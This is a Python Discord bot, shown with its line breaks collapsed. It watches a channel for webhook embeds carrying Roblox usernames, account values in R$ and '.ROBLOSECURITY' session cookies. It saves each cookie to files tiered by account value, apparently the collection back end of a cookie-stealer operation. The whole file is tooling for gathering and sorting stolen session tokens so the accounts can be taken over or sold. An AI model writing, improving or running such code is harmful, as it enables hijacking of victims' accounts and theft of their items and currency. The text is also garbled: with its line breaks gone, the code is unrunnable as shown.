import discordimport osimport refrom discord.ext import commandsfrom utils import extract_cookiefrom dotenv import load_dotenv# Load environment variablesload_dotenv()TOKEN = os.getenv('DISCORD_BOT_TOKEN')if TOKEN is None:    raise ValueError("DISCORD_BOT_TOKEN not found in environment variables")# Specify the channel ID to monitorCHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID'))  # Make sure to set this in your .env file# Enable all message intentsintents = discord.Intents.default()intents.message_content = True  # Critical for reading message contentintents.guilds = True            # Add guild-related permissionsintents.messages = True          # Allow reading messagesbot = commands.Bot(command_prefix='!', intents=intents)# Folder to store cookie filescookies_folder = "src/cookies"if not os.path.exists(cookies_folder):    os.makedirs(cookies_folder)MAX_COOKIES_PER_FILE = 500def get_file_based_on_summary(summary):    """Returns the filename based on the summary value."""    if summary < 1000:        return 'cookie_neg_1k.txt'    elif 1000 <= summary < 10000:        return 'cookie_1k.txt'    elif 10000 <= summary < 50000:        return 'cookie_10k.txt'    elif 50000 <= summary < 100000:        return 'cookie_50k.txt'    else:        return 'cookie_100k.txt'def save_cookie_to_file(user, summary, cookie):    """Saves the user, summary, and cookie to a text file based on the summary range."""    file_name = get_file_based_on_summary(summary)    file_path = os.path.join(cookies_folder, file_name)        # Get the current count of cookies in the file    if os.path.exists(file_path):        with open(file_path, 'r') as f:            lines = f.readlines()            current_count = len(lines)    else:        current_count = 0    with open(file_path, 'a') as f:        f.write(f"{current_count + 1}. {user}, {summary}, {cookie}\n")    print(f"Cookie saved to {file_path}")def extract_summary(value):    """Extracts the summary from the field value (e.g., Summary (R$<summary>) or Summary <summary>)."""    summary_match = re.search(r'R?\$?(\d+(?:,\d{3})*)', value)    if summary_match:        summary_str = summary_match.group(1).replace(',', '')        return int(summary_str)    return None@bot.eventasync def on_ready():    print(f'Bot is logged in as {bot.user}')@bot.eventasync def on_message(message):    # Check if the message is in the specified channel    if message.channel.id != CHANNEL_ID:        return  # Ignore messages from other channels    # Check if the message has embeds    if message.embeds:        print(f"Message received in channel {message.channel.name} with embeds: {message.embeds}")  # Debugging        for embed in message.embeds:            user = None            summary = None            cookie_found = False            print("Processing embed...")  # Debugging                        # Iterate over fields in the embed            for field in embed.fields:                print(f"Field Name: {field.name}, Field Value: {field.value}")  # Debugging                # Find the username (case-insensitive match for "username")                if "username" in field.name.lower():                    user = field.value.strip()                    print(f"Username found: {user}")  # Debugging                                # Find the summary (case-insensitive match for "summary")                if "summary" in field.name.lower():                    summary = extract_summary(field.value)                    print(f"Summary found: {summary}")  # Debugging                # Find the cookie in triple backticks                if "ROBLOSECURITY" in field.name or "cookie" in field.name:                    print(f"Attempting to extract cookie from field: {field.value}")  # Debugging                    cookie = extract_cookie(field.value)                    if cookie:                        cookie_found = True                        print(f"Cookie found: {cookie}")                        # Save cookie if both user and summary are found            if cookie_found and user and summary is not None:                save_cookie_to_file(user, summary, cookie)            else:                print("Cookie found but missing either username or summary.")    else:        print("No embeds in the message.")    await bot.process_commands(message)bot.run(TOKEN)